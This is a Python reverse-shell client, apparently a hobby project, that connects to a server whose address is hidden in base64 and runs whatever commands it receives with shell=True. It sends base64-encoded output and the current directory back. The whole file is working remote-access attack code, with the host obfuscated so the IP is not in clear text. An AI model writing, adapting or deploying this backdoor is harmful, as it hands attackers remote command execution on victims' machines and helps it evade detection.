#connect to server, wait for instructions, execute commands, and send results back to server
#add ssl for funs :)
import os
import socket
import subprocess
import base64


def get_base64(word):
    encoded = base64.b64encode(word)
    return encoded

def un_base64(word):
    decoded = base64.b64decode(word)
    return decoded


s = socket.socket()
#host = '127.0.0.1'
#simple encoding so IP is not in clear text
host64 = "MTI3LjAuMC4x"
hostdecode = base64.b64decode(host64)
port = 9999
#s.connect((host,port))
s.connect((hostdecode,port))
#print s.recv(1024)

#section for Sending DIR for userfiendly start
dir_b64 = get_base64(str(os.getcwd()))
dirs = b"%s>" % dir_b64
s.send(dir_b64)


while True:

    data = s.recv(1024)
    if data[:2].decode("utf-8") == 'cd': #no output from cd so need sot be handled differently
        os.chdir(data[3:].decode("utf-8"))
    if len(data) > 0: #ensure there is data
        #subprocess to execute command from server, decoded as utf-8
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        #command output and error (if any) is read into variable
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        #output_str = str(output_bytes, "utf-8")

        #cropping and cutting for the last dir - this is for user friendlyness to be more similar to a typical shell
        output_str = str(output_bytes)
        output_cwd = str(os.getcwd())
        output_cwd =  output_cwd.split("/")
        dir3 = (output_cwd[-1:])
        #encoding = str.encode(output_str, str(os.getcwd()) + '> ')
        OSDIR = ''.join([str(item) for item in dir3]) + '>'

        b64_encoding = get_base64(output_str+ OSDIR)
        encoding = b"%s> " % (b64_encoding)
        s.send(encoding,)
        #encoding2 = b"%s " % output_cwd
        #s.send(encoding2)
        #encoding_test = output_str.encode(output_str,'utf-8')
        #s.send(encoding_test)
        print(output_str) #prints command to own terminal
        #attempts without encoding
        #s.send("second Test")
        #s.send(cmd.stdout.read())

#Close Connection
s.close()
